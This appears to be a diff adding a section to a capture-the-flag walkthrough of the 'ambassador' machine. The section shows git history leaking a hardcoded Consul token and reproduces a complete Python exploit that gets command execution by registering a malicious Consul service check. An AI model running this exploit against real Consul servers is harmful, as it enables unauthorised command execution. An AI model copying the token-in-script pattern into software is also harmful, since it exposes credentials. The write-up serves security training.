@@ -662,4 +662,147 @@ Searching we found this:
 
 <br />
 
+As we can see, it is a vulnerability that allows us to exploit the consul API, but in order to do so we need to get a token.
+
+
+<br />
+
+## Get Token:
+
+<br />
+
+To get the token we will simply have to enumerate the .git repository that we had seen before in the my_app route:
+
+<br />
+
+```bash
+developer@ambassador:/opt/my-app$ git log
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:44:45 2022 +0000
+
+    config script
+
+commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:47:01 2022 +0000
+
+    created project with django CLI
+
+commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:44:11 2022 +0000
+
+    .gitignore
+developer@ambassador:/opt/my-app$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:44:45 2022 +0000
+
+    config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+new file mode 100755
+index 0000000..35c08f6
+--- /dev/null
++++ b/whackywidget/put-config-in-consul.sh
+@@ -0,0 +1,4 @@
++# We use Consul for application config in production, this script will help set the correct values for the app
++# Export MYSQL_PASSWORD before running
++
++consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+```
+
+<br />
+
+## Exploit Analysis:
+
+<br />
+
+Once we have the token, we proceed to analyze the exploit to see what it is doing and can exploit everything manually:
+
+<br />
+
+What this exploit is basically doing is a request by curl to a consul endpoint using PUT method and the consul token to load a file in json where the command we want will be executed.
+
+<br />
+
+```python
+'''
+- Author:      @owalid
+- Description: This script exploits a command injection vulnerability in Consul
+'''
+import requests
+import argparse
+import time
+import random
+import string
+
+def get_random_string():
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(15))
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-th", "--target_host", help="Target Host (REQUIRED)", type=str, required=True)
+    parser.add_argument("-tp", "--target_port", help="Target Port (REQUIRED)", type=str, required=True)
+    parser.add_argument("-c", "--command", help="Command to execute (REQUIRED)", type=str, required=True)
+    parser.add_argument("-s", "--ssl", help="SSL", type=bool, required=False, default=False)
+    parser.add_argument("-ct", "--consul-token", help="Consul Token", type=str, required=False)
+
+    args = parser.parse_args()
+    protocol = "https" if args.ssl else "http"
+    url = f"{protocol}://{args.target_host}:{args.target_port}"
+    consul_token = args.consul_token
+    command = args.command
+    headers = {'X-Consul-Token': consul_token} if consul_token else {}
+    
+    command_list = command.split(" ")
+    id = get_random_string()
+
+    data = {
+        'ID': id,
+        'Name': 'pwn',
+        'Address': '127.0.0.1',
+        'Port': 80,
+        "Check": {
+            "DeregisterCriticalServiceAfter": "90m",
+            "Args": command_list,
+            'Interval': '10s',
+            "Timeout": "86400s",
+        }
+    }
+
+    registerurl= f"{url}/v1/agent/service/register?replace-existing-checks=true"
+
+    r = requests.put(registerurl, json=data, headers=headers, verify=False)
+
+    if r.status_code != 200:
+        print(f"[-] Error creating check {id}")
+        print(r.text)
+        exit(1)
+
+    print(f"[+] Check {id} created successfully")
+    time.sleep(12)
+    desregisterurl = f"{url}/v1/agent/service/deregister/{id}"
+    r = requests.put(desregisterurl, headers=headers, verify=False)
+
+    if r.status_code != 200:
+        print(f"[-] Error deregistering check {id}")
+        print(r.text)
+        exit(1)
+    
+    print(f"[+] Check {id} deregistered successfully")
+```
+
+<br />
+
+
+
 
